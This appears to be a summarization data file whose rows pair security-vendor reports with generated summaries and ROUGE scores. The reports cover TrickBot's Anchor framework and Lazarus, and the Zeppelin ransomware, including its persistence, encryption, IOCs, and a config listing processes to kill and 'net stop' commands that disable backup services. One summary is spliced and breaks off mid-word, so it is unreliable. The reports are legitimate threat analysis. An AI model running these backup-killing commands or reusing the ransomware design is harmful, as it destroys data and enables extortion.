attackers' decision how to carry on.""The world's most famous and dangerous APT (state-developed) malware";North Korea's Lazarus Group has recently become a customer of the TrickBot gang, from whom they rent access to already infected systems, along with a new type of attack framework that researchers are calling Anchor. The Anchor malware strain is provided as a TrickBot module. TrickBot is one of today's top three malware botnets, together with Emotet and Dridex. It is a gigantic network of computers that have been infected with the TrickBot trojan. However, TrickBot is also a CybercrimeasaService operation. The TrickBot gang rents access to TrickBotinfected computers to other malware gangs. These gangs vary from ransomware operators to online spammers, fraudsters, and more. Renters can use the TrickBot trojan to install their own malware or one of the available TrickBot modules, depending on what operations they want to carry out on infected hosts. Meet Anchor, TrickBot's most advanced module In reports published today by both Cybereason and SentinelOne, the two companies say that Anchor is a new TrickBot module that was built for a specific market niche, namely for hackers looking to remain silent and undetected on the systems they infect. Anchor is TrickBot's attempt at creating a module around stealth features first. It's a tool to be used in attacks targeted at large corporations, where the hackers need to remain undetected for weeks or months while they steal data , and even long after the intrusion ended. The SentinelOne report suggests that Lazarus Group, a North Korean hacking group, used the TrickBot botnet to install PowerR;en;{'r': 0.34085778781038373, 'p': 0.9556962025316456, 'f': 0.5024958363905969};{'r': 0.2601726263871763, 'p': 0.9017094017094017, 'f': 0.4038277477205376};{'r': 0.34085778781038373, 'p': 0.9556962025316456, 'f': 0.5024958363905969}
https://www.sentinelone.com/labs/anchor-project-the-deadly-planeswalker-how-the-trickbot-group-united-high-tech-crimeware-apt/;The Deadly Planeswalker: How The TrickBot Group United High-Tech Crimeware & APT - SentinelLabs;"Research by: Vitali Kremez, Joshua Platt and Jason ReavesThe Wind of Time Shakes the Underground | High-Tech Cybercrime & APT | Most Sophisticated & Resourceful Crimeware GroupRead the Full ReportWhen we talk about cybercrime, we often portray a hidden, hazardous realm, which is radically different from the one that we live in. In fact, hackers and their cybercrime enterprises exist in the same world as ours and undergo the same social and economic transformations as those which shape our reality.When cybercrime emerged, it followed the rules of the late industrial age. Despite their Fin de siecle fleur of harbingers of the radically novel era, cybercriminal communities relied on standard, if not mundane operational rules of classic enterprises -- separation of functions, division of labor, focused specialization. In other words, underground malware engineers who developed information stealers most likely never had a chance or intent to talk to hackers who developed ransomware, hacktivists did not collaborate with cyber fraudsters or carders, while for-profit criminals and nation-state advanced persistent threat (APT) operatives preferred to maintain a clear separation line.Everything changed with time. Unlike its predecessor which valued separation and operational boundaries, the 21st century manifested the interconnectivity as its essential trait. Facebook, Google, Uber, all succeeded because they were able to unite the previously ""ununitable."" This strive to merge domains and cross borders became a rule for success, a natural destination of evolution. Like other humans, cybercriminals felt the zeitgeist -- they evolved accordingly. However, only one group was able to crown this evolution -- the elite ""TrickBot"" group.This story begins in the year in which the century clearly demonstrated its rapidly changing nature. 2013 -- the call for radical social change shakes the Middle East and Europe alike, the Pope announces his renunciation the first time in 700 years, the Voyager 1 exits the Solar System and reaches the interstellar medium. The transformations of cybercrime were no less fundamental. Banking malware -- a malware designed to steal financial information -- were rapidly acquiring new functions and traits consummating with the success of GameOver Zeus, also known as ""Peer-to-Peer Zeus"", cybercrime group that became known as ""Business Club.""The developers of this crimeware employed an alternative approach to their botnet -- offering it as a service for other threat actors. The GameOver Zeus service also pioneered the deployment of ransomware such as a prolific ""Cryptolocker"" responsible in millions of losses and affecting victims worldwide. Overall, GameOver Zeus was a major success in introducing a profoundly new model -- cybercrime-as-a-service (CaaS). This model was based on automation, customization, and client-oriented approach and perfectly fit the demand of the expanding postindustrial private market. The Business Club model was operated by the most wanted cybercriminal, a Russian national Evgeniy Mihailovich Bogachev, or simply known as ""Slavik"" amongst the club members fellow cybercriminals.It was only a matter of time when other groups will incorporate GameOver Zeus's innovative modeling. In 2014, two cybercrime teams and former customers and members of ""Business Club"" form separate crimeware models became known as ""Dridex"" and ""Dyre."" Both Dridex and Dyre made its way to the headlines by advancing the CaaS model and supplying various types of cybercriminals with their botnet solutions.In the meantime, Dridex and their operators, also known as ""Evil Corp,"" continues to successful experimenting with targeted highly-impactful bank fraud and ransomware operations including working with such targeted ransomware variants as ""BitPaymer"" and ""DoppelPaymer"" responsible for multiple worldwide ransomware disruptions including the PEMEX intrusion. In December 2019, the Dridex botnet operators were charged and indicted by the international law enforcement and sanctioned the leader behind Makism Yakubets, known as ""aqua,"" and its administrator Igor Turashev, known as ""nintutu,"" for their involvement in another massive more than $100-million bank fraud and ransomware operations. Notably, Yakubetz was alleged close involvement with the Russian government and the FSB operations acquiring confidential documents through cyber-enabled means and cyber-enabled operations on its behalf.In 2016, Dyre operators were alleged to be arrested in Moscow, Russia, however, their work and ideas accumulated in the tool -- TrickBot. Trickbot engineers designed the bot in such a way to plug into the Dyre backend systems seamlessly while preserving independence from the Dyre components.TrickBot Race to Perfection: The Aesthetics of Blurred LinesTrickBot was developed in 2016 as a banking malware. However, since then it has developed into something essentially different -- a flexible, universal, module-based crimeware solution. TrickBot has been evolved to specifically attack corporations. The three pillars of TrickBot's success were ironically the buzzwords of the post-industrial revolution -- automation, decentralization, and integration.Early reports on TrickBot appeared in Fall 2016. By November 2016, the malware was already tested and functional. TrickBot developers began to add new functions to cross the borders -- first, literal borders. Initially targeting Australian banks, by November 2016 TrickBot had included New Zealand, British, German, and Canadian banks into its victim list. In July 2017, TrickBot was equipped with advanced automation -- another crucial trait that characterized this malware. TrickBot was now capable of worm-like spreading within the network after the initial infection.Then the expansion of functions followed. In October 2017, the crimeware group gathered data from mail clients and scraped web-history in search of personal identifiers. Later, new password grabber modules turned TrickBot into a fully-fledged stealing tool that was able to browse Google Chrome, Mozilla Firefox, Microsoft Edge, and other applications containing passwords and credentials.As a result, by 2018, the TrickBot group was swamped by a humongous data flow from infected machines. The group faced ""big data"" problems which required them to engineer a custom solution dealing with commercial size data flows and essentially design a ""data lake"" service to process it. The group faced a paradox in which its technological efficiency was not matched by the capabilities to process and monetize the information stolen. It was this moment when the organizational and strategic talent of the operators, and, possibly, the experience of Dyre came to play.Instead of harvesting and storing the compromised information as raw material, TrickBot decided to process and index it and offer access to it as a service. For instance, the spying capability was redesigned with a new feature with which TrickBot gathered and transferred network and domain controller victim information. With this function, TrickBot could provide other groups with critical security information which was then used to prioritize victims. In other words, a TrickBot customer knew who was the least protected prey in the lists. In other instances, breaches and botnet data were indexed through the backend to track the high-value targets. In this sense, the group weaponized these infections for the potent, targeted ransomware, or as they called it a ""cryptolocker,"" which became known as ""Ryuk"" ransomware affecting and crippling industries worldwide across multiple market segments, including healthcare and aviation industries. The criminal groups used specific digital identifiers obtained via TrickBot to spot the most lucrative industry targets for their ransomware campaigns.Moreover, the group decentralized if not ""Uberized"" its operations and started to massively sublet its technical solutions to affiliate groups. TrickBot products have often used a combination with other malware including highly infective Emotet, IcedID/BokBot, and Gozi ISFB v2.The flexibility was achieved through active use of modules. The modular structure allowed TrickBot to efficiently operate in different environments which were previously separated. TrickBot and its modules acted in the following major ways:a perfect information stealer grabbing personal information, which was then sold on the underground and used privately,a banker, stealing corporate data which monetized through account takeover and card frauda distributor, delivering ransomware, anda cryptominer.By 2019, Automation, Decentralization, and Integration enabled TrickBot to introduce a game-changing model. Their domain controller harvester enabled automatic network information collection and automated lateral movement within networks, not even mentioning the completely automated process of credential harvesting. The ability to integrate different cybercrime segments allowed to perform sophisticated bank fraud operations for money laundering, engage in ransomware and tax fraud. Decentralization created a flexible business model, where TrickBot offered attack tools to vetted vendors and used the tools of others to increase the infectivity.In blurring the lines between breaches, data theft, ransomware, and cyber fraud, the group has almost reached the pinnacle, and almost united the cybercrime territories. However, there was one final challenge separating TrickBot from perfection -- the APTs.The ""Anchor"" MysteryAdvanced Persistent Threat is a type of cybercrime which is most often associated with the nation-state actors. While the attribution is often a subject of political accusations and social discussion, the APT groups are indeed extremely sophisticated and are characterized by an ultimate focus on espionage. This defines the persistence in their operations -- to accomplish their mission targets, APT teams need to secretly remain in the system, navigate and observe. APTs saw their heyday in 2016 and 2017 when professional intrusion teams performed massive operations against top-banks and attacks against the SWIFT payment system.The modus operandi of APT has targeted attacks on extremely secure networks, remaining persistent and undetected for long periods, and espionage separates them from crimeware and TrickBot which are generally are deployed merely for monetary gain. This is why it was highly unlikely that TrickBot would attempt to integrate APTs into their operations. Until a new TrickBot derivative project called ""Anchor"" was discovered.While investigating the Anchor project we observed a framework of tools that allows the actors -- potential TrickBot customers -- to leverage this framework against higher-profile victims. Some of the pieces we have found for this framework can be seen below in the form of PDB paths. Anchor consists of several segments each with a specific function:anchorInstalleranchorDeInstallerAnchorBotBin2hexpsExecutormemoryScraperThis structure is designed to secretly upload the malware and clean up all the evidence of the attack. However, the ultimate goal of this innovation is unclear until we examine other modules. From looking at any TrickBot modules we can clearly understand its purpose. But when it comes to Anchor we see a combination of functionality, tools, and methods. What is out of the question, however, is the sophistication of this technology including an integrated methodology of loading such frameworks Metasploit, Cobalt Strike, TerraLoader, and PowerShell Empire to perform further victim post-exploitation.The Anchor project combines a collection of tools -- from the initial installation tool to the cleanup meant to scrub the existence of malware on the victim machine. In other words, Anchor presents as an all-in-one attack framework designed to compromise enterprise environments using both custom and existing toolage.As described earlier, TrickBot modules are customer-based, designed for the needs of a specific criminal activity. The Anchor project is a complex and stealthy tool for targeted data extraction from secure environments and long-term persistency. Logically, this tool will be a very tempting acquisition for high-profile, possibly nation-state groups. However, the Anchor is also be used for large cyber heists and point-of-sale card theft operations leveraging its custom card scraping malware. Among the nation-state groups, only a few are interested in both data collection and financial gain, and one of them is Lazarus.Lazarus Group (also known as ""Lazarus,"" ""Hidden Cobra,"" and ""Kimsuky"") is an advanced persistent threat (APT) group comprised of operators from ""Bureau 121"" (121?), the cyber warfare division of North Korea's RGB. The group has been active since at least 2009 and is presumed to operate out of a multitude of international locations.Lazarus appears to have been interested in a variety of sectors and targets in the last eighteen months, including cryptocurrency exchanges, financial institutions, non-governmental organizations, and South Korean individuals. Many North Korea cyber operators are likely not only self-funded but also tasked with earning income for the North Korean regime, Lazarus Group has likely targeted banks cryptocurrency exchanges and users to achieve this goal.During our investigation of Anchor, we discovered the tool PowerRatankba that was previously linked to the purported North Korean group was, in fact, used in Anchor.The specific evidence pointed out that this Lazarus group toolkit was loaded via the TrickBot Anchor project pointing to the now-unmasked relationship between the tools attributed to TrickBot ""Anchor"" group and Lazarus.Uniting the Ununitible -- Crimeware Meets APTThe integration of these tools into the Anchor implies that TrickBot was able to overcome the final barrier in integrating different domains into its model. By integrating the APT approach to its model the group turned its enterprise into a holistic ecosystem of cybercrime, becoming an essentially new phenomenon. In this ecosystem, crimeware and APT are no longer siloed, on the opposite, each type of crime creates added value for the other, each becomes a force multiplier.Conclusion: The Deadly PlaneswalkerThe Anchor is not simply a new addition to a long list of TrickBot modules and projects, it is a conclusion of many years of the cybercrime evolution, a point at which all puzzles assemble. Through its history, TrickBot was adding new markets to its area of operations, steadily conquering the cybercrime world. First, it blurred the line between infostealing and bankers then between trojans and ransomware and between financial fraud and malware.Through the history of cybercrime, APT was a Kantian ""thing-in-itself"", making it an integral part of a broader business model required a technical and organizational revolution. With the Anchor project, TrickBot became this revolutioner. TrickBot and Dridex groups remained to be some of the most sophisticated crimeware groups since ""Business Club."" While Dridex's ""Evil Corp"" members were publically charged and outed responsible for over $100 million in losses, the TrickBot group continued to innovate and stay active with more diverse crimeware models than Dridex.The ability to seamlessly integrate the APT into a monetization business model is evidence of a quantum shift. By accomplishing this integration, TrickBot overtly demonstrates that they have achieved a qualitatively new level of a cybercrime enterprise, which was never seen before in magnitude and complexity superseding and dethroning the legacy of its previous inspiration and its playground known as ""Business Club.""Read the Full ReportIOCs on GitHub";"The Wind of Time Shakes the Underground | HighTech Cybercrime & APT | Most Sophisticated & Resourceful Crimeware GroupRead the Full ReportWhen we talk about cybercrime, we often portray a hidden, hazardous realm, which is radically different from the one that we live in. In fact, hackers and their cybercrime enterprises exist in the same world as ours and undergo the same social and economic transformations as those which shape our reality.When cybercrime emerged, it followed the rules of the late industrial age. Despite their Fin de siecle fleur of harbingers of the radically novel era, cybercriminal communities relied on standard, if not mundane operational rules of classic enterprises separation of functions, division of labor, focused specialization. In other words, underground malware engineers who developed information stealers most likely never had a chance or intent to talk to hackers who developed ransomware; hacktivists did not collaborate with cyber fraudsters or carders, while forprofit criminals and nationstate advanced persistent threat (APT) operatives preferred to maintain a clear separation line.Everything changed with time. Unlike its predecessor which valued separation and operational boundaries, the 21st century manifested the interconnectivity as its essential trait. Facebook, Google, Uber, all succeeded because they were able to unite the previously ""ununitable."" This strive to merge domains and cross borders became a rule for success, a natural destination of evolution. Like other humans, cybercriminals felt the zeitgeist they evolved accordingly. However, only one group was able to crown this evolution the elite ""TrickBot"" group.This story begins in the year in which the century The Dridex botnet operators were charged and indicted by the international law enforcement and sanctioned the leader behind Makism Yakubets, known as ""aqua,"" and its administrator Igor Turashev, known as ""nintutu,"" for their involvement in another massive more than $100million bank fraud and ransomware operations. Notably, Yakubetz was alleged close involvement with the Russian government and the FSB operations acquiring confidential documents through cyberenabled means and cyberenabled operations on its behalf.In 2016, Dyre operators were alleged to be arrested in Moscow, Russia; however, their work and ideas accumulated in the tool TrickBot. TrickBot engineers designed the bot in such a way to plug into the Dyre backend systems seamlessly while preserving independence from the Dyre components.TrickBot Race to Perfection: The Aesthetics of Blurred LinesTrickBot was developed in 2016 as a banking malware. However, since then it has developed into something essentially different a flexible, universal, modulebased crimeware solution. TrickBot has been evolved to specifically attack corporations. The three pillars of TrickBot's success were ironically the buzzwords of the postindustrial revolution automation, decentralization, and integration.Early reports on TrickBot appeared in Fall 2016. By November 2016, the malware was already tested and functional. TrickBot developers began to add new functions to cross the borders first, literal borders. Initially targeting Australian banks, by November 2016 TrickBot had included New Zealand, British, German, and Canadian banks into its victim TrickBot is a sophisticated malwareasaservice (MaaS) platform that enables cybercriminals to launch targeted ransomware, bank fraud, and tax fraud operations. TrickBot's modular structure allows it to efficiently operate in different environments which were previously separated. TrickBot and its modules acted in the following major ways:a perfect information stealer grabbing personal information, which was then sold on the underground and used privately,a banker, stealing corporate data which monetized through account takeover and card frauda distributor, delivering ransomware, anda cryptominer.By 2019, Automation, Decentralization, and Integration enabled TrickBot to introduce a gamechanging model. Their domain controller harvester enabled automatic network information collection and automated lateral movement within networks, not even mentioning the completely automated process of credential harvesting. The ability to integrate different cybercrime segments allowed TrickBot to perform sophisticated bank fraud operations for money laundering, engage in ransomware and tax fraud. Decentralization created a flexible business model, where TrickBot offered attack tools to vetted vendors and used the tools of others to increase the infectivity.In blurring the lines between breaches, data theft, ransomware, and cyber fraud, the group has almost reached the pinnacle, and almost united the cybercrime territories. However, there was one final challenge separating TrickBot from perfection the APTs.The ""Anchor"" MysteryAdvanced Persistent Threat is a type of cybercrime which is most often associated with the nationstate actors. While the att Thank you for your input.";en;{'r': 0.40038684719535783, 'p': 0.9561200923787528, 'f': 0.5644171737532974};{'r': 0.2952515279736718, 'p': 0.9088277858176556, 'f': 0.44570617089027453};{'r': 0.40038684719535783, 'p': 0.9561200923787528, 'f': 0.5644171737532974}
https://blogs.blackberry.com/en/2019/12/zeppelin-russian-ransomware-targets-high-profile-users-in-the-us-and-europe;Zeppelin: Russian Ransomware Targets High Profile Users in the U.S. and Europe;"Zeppelin: Russian Ransomware Targets High Profile Usersin the U.S. and EuropeIntroductionZeppelin is the newest member of the Delphi-based Ransomware-as-a-Service (RaaS) family initially known as Vega or VegaLocker. Although it's clearly based on the same code and shares most of its features with its predecessors, the campaign that it's been part of differs significantly from campaigns involving the previous versions of this malware.Vega samples were first discovered in the beginning of 2019, being distributed alongside other widespread financial malware as part of a malvertising operation on Yandex.Direct - a Russian online advertising network. This campaign was aimed at Russian speaking users (with apparent focus on the people working in accounting) and was designed to have a broad reach, as opposed to careful targeting. The binaries were often signed with a valid certificate and hosted on GitHub. During a course of this year, several new versions of Vega appeared, each bearing a different name (Jamper, Storm, Buran, etc.), some of them offered as a service on underground forums.The recent campaign that utilizes the newest variant, Zeppelin, is visibly distinct. The first samples of Zeppelin - with compilation timestamps no earlier than November 6, 2019 - were discovered targeting a handful of carefully chosen tech and healthcare companies in Europe and the U.S. In a stark opposition to the Vega campaign, all Zeppelin binaries (as well as some newer Buran samples) are designed to quit if running on machines that are based in Russia and some other ex-USSR countries.Zeppelin appears to be highly configurable and can be deployed as an EXE, DLL, or wrapped in a PowerShell loader. The samples are hosted on water-holed websites and, in the case of PowerShell, on Pastebin. There are reasons to believe at least some of the attacks were conducted through MSSPs, which would bear similarities to another recent highly targeted campaign that used a ransomware called Sodinokibi.The major shift in targeting from Russian-speaking to Western countries, as well as differences in victim selection and malware deployment methods, suggest that this new variant of Vega ransomware ended up in the hands of different threat actors - either used by them as a service, or redeveloped from bought/stolen/leaked sources.ObfuscationAll sensitive strings in Zeppelin binaries are obfuscated with a different pseudo-random 32-byte RC4 key, prepended to each encrypted string:Figure 1: Obfuscated stringThe string obfuscation acts as a crude polymorphism mechanism, as each generated sample will use different RC4 keys. It also helps Zeppelin evade detection and complicates analysis.Although the majority of samples are not packed, BlackBerry Cylance researchers have come across Zeppelin executables protected by attackers using additional polymorphic obfuscation software.In these cases, the Zeppelin executables were wrapped in three layers of obfuscation:Code of varying size using a set of random APIs (often associated with benign software) and several stalling loops to deceive heuristic mechanisms and outrun sandboxes.First stage shellcode, encoded with simple XOR using a static 1-byte key derived from a hardcoded DWORD value. This shellcode decodes the payload binary, together with its loader, using 1-byte XOR, but this time the key is mutated for each decryption round.Second stage shellcode which injects the payload binary into memory and executes it:Figure 2: Example of a stalling loop in the first layer of obfuscationFigure 3: Payload decoding shellcodeConfigurationThe ransomware appears to have the following Boolean options:ID Name Description 1 (none) Run as DLL: one instance encrypting all drives and shares (as opposed to EXE), incompatible with ""Startup"" option. 2 IP Logger Use IPLogger service (iplogger[.]ru or iplogger[.]org) to track victim's IP address and country code. 3 Startup Copy itself to another location, set persistence, launch with ""-start"" parameter. 4 Delete backups Execute specified commands, used to stop certain services, disable recovery, delete backups and shadow copies, etc. 5 Task-killer Kill specified processes. 6 Auto-unlock busy files Try to unlock files that appear locked during encryption. 7 Melt Before exiting, inject self-deletion thread to notepad.exe (deletes the executable, as well as all added registry values). Exit with 0xDEADFACE code. 8 UAC prompt When re-running try elevating privileges (only used when ""Startup"" set).These options, along with the public RSA key and other configurable strings, can be set from the Zeppelin builder user-interface during generation of the ransomware binary:Figure 4: Example configurationAll configurable data is stored in the .itext section of the Zeppelin binary and includes:Hardcoded public key (modulus and exponent separately)GUID (differs for each sample)URL address for IPLogger check-inExcluded folders listExcluded files listExcluded extensions listList of processes to killList of commands to runReadme file nameReadme file contentExecutionThe ransomware binary can be executed with the following parameters:Parameter Description <path to an existing file> Encrypt one file <path to an existing directory> Encrypt files in the specified directory -start Skip installation and execute the second stage of malicious code (i.e. file encryption) -agent <int> Run as an agent, encrypt files in the path specified in a value under HKCU/Software/Zeppelin/Paths key, where <int> is the name of the value (consecutive numbers starting with 0) (no parameters) Default encryption routineInstallationUpon initial execution (without parameters), the malware will check the victim's country code to make sure it's not running in one of the following countries:Russian FederationUkraineBelorussiaKazakhstanDepending on the options set during the building process, it will either check the machine's default language and default country calling code or use an online service to obtain the victim's external IP address:Figure 5: Checking victim's countryThe malware creates an empty file in the %TEMP% directory with the "".zeppelin"" extension and a name that is a CRC32 hash of the malware path.If the ""Startup"" option is set the malware will copy itself to the %APPDATA%\Roaming\Microsoft\Windows directory using a name randomly chosen from the list of active processes (ignoring any processes that were invoked with an ""install"" or ""setup"" command-line argument).The chosen name is then encrypted with a randomly generated 32-byte RC4 key, base64 encoded (together with the prepended key) and saved to a registry value called ""Process"" under HKCU\Software\Zeppelin.After setting persistence via the HKCU\Software\Microsoft\Windows\CurrentVersion\Run key in the registry, the ransomware will re-execute itself from the new path with the ""-start"" argument. If the ""UAC prompt"" option is set, it will try to run with elevated privileges.If the ""Melt"" option is set, a self-deletion thread will be injected into a newly spawned notepad.exe process and the malware will exit with the code 0xDEADFACE. Otherwise, it will simply exit with code 0.Network CommunicationLike its predecessors, Zeppelin allows attackers to track the IP addresses and location of victims via the IPLogger web service. If the relevant option is set, the ransomware will try to check-in by sending a GET request to a hardcoded URL that was generated by using the IPLogger URL Shortener service. The User-Agent field id set to ""ZEPPELIN"" and the referrer field contains a unique victim ID, created during the key generation phase:Figure 6: GET request with custom headersTo prevent a victim from checking in more than once, a ""Knock"" value of 0x29A (666) is written under HKCU\Software\Zeppelin. If the value already exists, the malware will not try to contact the URL on subsequent runs.Attackers can use the IPLogger web service to view a list of victims and use the shortened URL to redirect users to other malicious content.Key GenerationThe encryption algorithm has not changed substantially compared to previous versions of Buran. It employs a standard combination of symmetric file encryption with randomly generated keys for each file (AES-256 in CBC mode), and asymmetric encryption used to protect the session key (using a custom RSA implementation, possibly developed in-house).First, the malware will generate a pair of 512-bit RSA keys for the victim and save them to memory in the following format:<N>{privatekey_modulus_hexstr}</N><D>{privatekey_exponent_hexstr}</D><N>{publickey_modulus_hexstr}</N><E>{publickey_exponent_hexstr}</E>Figure 7: Example of encryption keys: attacker's public key (blue), generated victim's public key (green) & private key (red), their encrypted and base64 encode versions (yellow)The private key from this pair will be encrypted using the attacker's 2048-bit public RSA key hardcoded in the .itext section of the binary. Both the victim's RSA encrypted private key and its corresponding public key will then be further obfuscated with a randomly generated 32-byte RC4 key, base64 encoded (together with the prepended RC4 key) and saved to the registry under HKCU\Software\Zeppelin\Keys as ""Public Key"" and ""Encrypted Private Key"" respectively:Figure 8: Encryption of the victim's private keyA unique victim ID is then created using the first 11 bytes of the victim's RSA public key modulus and replacing the third and seventh character with a dash ""-"" character. An example ID for the keys shown above would be 389-04C-3D7.File EncryptionZeppelin will enumerate files on all drives and network shares to build a list of directories. Depending on the binary type, it will either use the WNetEnumResource API (if running as an EXE) or the following command (if running as a DLL):chcp 1250 && net viewFor each file that doesn't match the excluded files/extensions list, the malware will perform the following actions:1. Save the original file attributes and access times to memory and set FILE_ATTRIBUTE_ARCHIVE2. Prepend a ""666"" string to the plain text file3. Generate a random 32-byte AES symmetric key and 16-byte Initialization Vector (IV)4. Encrypt the file using AES-256 in CBC mode (only the first 0x10000 bytes, the rest of the file content remains unencrypted)5. Encrypt the AES key with the victim's public RSA key and then further obfuscate it with a randomly generated 32-byte RC4 key:Figure 9: AES key encryption6. Prepend a hardcoded marker string to the encrypted file, together with the 8-byte length of encrypted data and 8-byte length of original data (including previously added 3-byte ""666"" string):Figure 10: Encrypted file header, marker string (green) and file sizes (red), followed by encrypted content7. Append the following information after the encrypted file content:Length Description 4 Length of the next field 0x28 (40) 32-byte RC4 key followed by 8 encrypted zero bytes 4 Length of the next field 0xBB (187) RC4 obfuscated, RSA-encrypted AES key 4 Length of the next field 0x4F4 (1268) Victim's private key asymmetrically encrypted with the attacker's public key 4 Size of data to encrypt 8 Original file size 4 Size of all appended dataFigure 11: Encrypted file footer8. Rename the file to append the victim's unique ID as an extension9. Set the file attributes and access times back to original10. Proceed to the next fileIf Zeppelin is running as an executable, the first instance of the ransomware will encrypt the files on the current logical drive and spawn a number of subsequent processes with the ""-agent"" parameter. These processes are responsible for encrypting files on other drives and network shares. All paths to encrypt are stored under the HKCU\Software\Zeppelin\Paths registry key.Interestingly, some of the samples will encrypt only the first 0x1000 bytes (4KB), instead of 0x10000 (65KB). It might be either an unintended bug, or a conscious choice to speed up the encryption process while rendering most files unusable anyway.After encrypting all files, Zeppelin will drop a ransom note text file and display it in notepad. The filename and contents are configurable by the attacker. BlackBerry Cylance researchers have uncovered several different versions, ranging from short, generic messages to more elaborate ransom notes tailored to individual organisations. All the messages instruct the victim to contact the attacker via a provided email addresses and quote their personal ID number. The attackers are using several secure email providers that are notoriously associated with ransomware, such as firemail[.]cc, Protonmail and Tutanota. Additionally, one of the ransom notes uncovered provides an email address associated with a .onion domain that is only accessible via Tor.ConclusionRansomware, once in decline, has experienced a resurgence due to the efforts of innovative threat actors. For example, the actors behind Zeppelin demonstrate a dedication to their craft by deploying precise attacks against high-profile targets in the IT and health sectors. Targeting specific organizations rather than every reachable user is just one example of how ransomware attacks continue to evolve. The ongoing refinement of ransomware attacks serves as a stark reminder that effective cyber security should be proactive, predictive, adaptive, and semi-autonomous.BlackBerry Cylance researchers aim to keep organizations one step ahead of cyberattacks by sharing threat analysis like this with the public. For an informative analysis of other threats, visit us at http://www.cylance.com.APPENDIXIndicators of Compromise (IOCs)04628e5ec57c983185091f02fb16dfdac0252b2d253ffc4cd8d79f3c79de2722 SHA256 39d8331b963751bbd5556ff71b0269db018ba1f425939c3e865b799cc770bfe4 SHA256 4894b1549a24e964403565c61faae5f8daf244c90b1fbbd5709ed1a8491d56bf SHA256 e22b5062cb5b02987ac32941ebd71872578e9be2b8c6f8679c30e1a84764dba7 SHA256 1f94d1824783e8edac62942e13185ffd02edb129970ca04e0dd5b245dd3002bc SHA256 d61bd67b0150ad77ebfb19100dff890c48db680d089a96a28a630140b9868d86 SHA256 HKCU\Software\Zeppelin Reg key {961367AF-2538-7AA3-CE0E-20CBF2F40FD2} GUID {4B76FDEB-DA9A-2C56-7460-BB8AB48A34C5} GUID {56A680F5-496F-8328-C080-FDF866E8183F} GUID {EEDECCF1-06D1-0333-0333-1084CF2219BB} GUID {A321064D-1177-5C30-7EE6-AEFD48302DCB} GUID {81732134-D330-05F5-35FC-57B2E8FFB983} GUID https[://]iplogger[.]org/1HVwe7.png URL https[://]iplogger[.]org/1HCne7.jpeg URL https[://]iplogger[.]org/1Hpee7.jpeg URL https[://]iplogger[.]org/1syG87 URL https[://]iplogger[.]org/1H7Yt7.jpg URL https[://]iplogger[.]org/1wF9i7.jpeg URL bad_sysadmin(at)protonmail[.]com Email Vsbb(at)firemail[.]cc Email Vsbb(at)tutanota[.]com Email buratino(at)firemail[.]cc Email buratino2(at)tutanota[.]com Email ran-unlock(at)protonmail[.]com Email ranunlock(at)cock[.]li Email buratin(at)torbox3uiot6wchz[.]onion EmailExample of Hardcoded ConfigurationPublic RSA Key Modulus17DB1021E0A86DAAB34E261C1FFB0864EB5DBD825B5EC3B30C8CA42A6F368ADEFECAF242FD8F36D421EEE13D90802EFD2617FF0DE8D4C3C4924648F9249C42F08854EEEDF8DA14E76DD8497BB0C8FD09C1B71CA5496519A2088809905373D28AB511B104405F200CCE7B13BE61DC7C13FF478D72208764F69A7BF5812FB115F436BF4097A59CF27F99E0DCB8A9697EEF5338B13CCA2AB52E878FD9A13D2BA834D8204A35BCAC2247ACFD8CC8AC29838904DEDFD8B0F84140EA32E9FE921B5319C1E279C0F356DA7B1F4D2A77EDA5B559240ACCBD395968C0B3D2626273B58F6AA1EB58E7420F07805E5467E1908E6528000BADB59178EF087AEAEBEE6BB7F41DFDPublic RSA Key Exponent1519D8329EAF8C9301527CE7A3CC7FF48E7C022973B98C513F8AFA32155519C82B9B64565B0A0EEEB7B71D1140C073A68FE3B28DADA12A115DB6A25D6DED4304F2298F4ED5A5F4CA42F313F6FBA174A7440C2EED50CF6DAF603DB5CC417D4B787C0366762D3AB3F2A4E348BA2ED73781CE3793CDD63197FC47BC80BC2065547148CD5C42665419EEBE5AA181DEC91160D1B76E18CCAECD2D024E8363FB49E9923C53F2A86973D038F1D8F68BF4F26DF70D4ED5B404E835C364E3299874F443E4C0486FED0B1F4AA15C4E6837FC3C2892646EC91E232C76A831FE8667288A9A9A987B9767070D832C406EE13353FD83696B9F9435C0F4E5FC91F0AED0F2839FB9C5Unique ID of the Malware Sample:{961367AF-2538-7AA3-CE0E-20CBF2F40FD2}IPLogger URL:https[://]iplogger[.]org/1HVwe7.pngExcluded Folders:%WINDIR% :\$Windows.~bt\,:\System Volume Information\,:\Windows.old\,:\Windows\,:\intel\,:vidia\,:\inetpub\logs\,\All Users\,\AppData\,\Apple Computer\Safari\,\Application Data\,\Boot\,\Google\,\Google\Chrome\,\Mozilla Firefox\,\Mozilla\,\Opera Software\,\Opera\,\Tor Browser\,\Common Files\,\Internet Explorer\,\Windows Defender\,\Windows Mail\,\Windows Media Player\,\Windows Multimedia Platform\,\Windows NT\,\Windows Photo Viewer\,\Windows Portable Devices\,\WindowsPowerShell\,\Windows Photo Viewer\,\Windows Security\,\Embedded Lockdown Manager\,\Windows Journal\,\MSBuild\,\Reference Assemblies\,\Windows Sidebar\,\Windows Defender Advanced Threat Protection\,\Microsoft\,\Package Cache\,\Microsoft Help\,Excluded Files:boot.ini,bootfont.bin,bootsect.bak,desktop.ini,iconcache.db,ntdetect.com,ntldr,ntuser.dat,ntuser.dat.log,ntuser.ini,thumbs.db,Excluded Extensions:.bat,.cmd,.com,.cpl,.dll,.msc,.msp,.pif,.scr,.sys,.log,.lnk,.zeppelin,List of Processes to Kill:agntsvc.exe,agntsvc.exeagntsvc.exe,agntsvc.exeencsvc.exe,agntsvc.exeisqlplussvc.exe,anvir.exe,anvir64.exe,apache.exe,backup.exe,ccleaner.exe,ccleaner64.exe,dbeng50.exe,dbsnmp.exe,encsvc.exe,far.exe,firefoxconfig.exe,infopath.exe,isqlplussvc.exe,kingdee.exe,msaccess.exe,msftesql.exe,mspub.exe,mydesktopqos.exe,mydesktopservice.exe,mysqld-nt.exe,mysqld-opt.exe,mysqld.exe,ncsvc.exe,ocautoupds.exe,ocomm.exe,ocssd.exe,oracle.exe,oracle.exe,procexp.exe,regedit.exe,sqbcoreservice.exe,sql.exe,sqlagent.exe,sqlbrowser.exe,sqlserver.exe,sqlservr.exe,sqlwriter.exe,synctime.exe,taskkill.exe,tasklist.exe,taskmgr.exe,tbirdconfig.exe,tomcat.exe,tomcat6.exe,u8.exe,ufida.exe,visio.exe,xfssvccon.exe,List of Commands to Run:net stop ""Acronis VSS Provider"" /y,net stop ""Enterprise Client Service"" /y,net stop ""SQL Backups"" /y,net stop ""SQLsafe Backup Service"" /y,net stop ""SQLsafe Filter Service"" 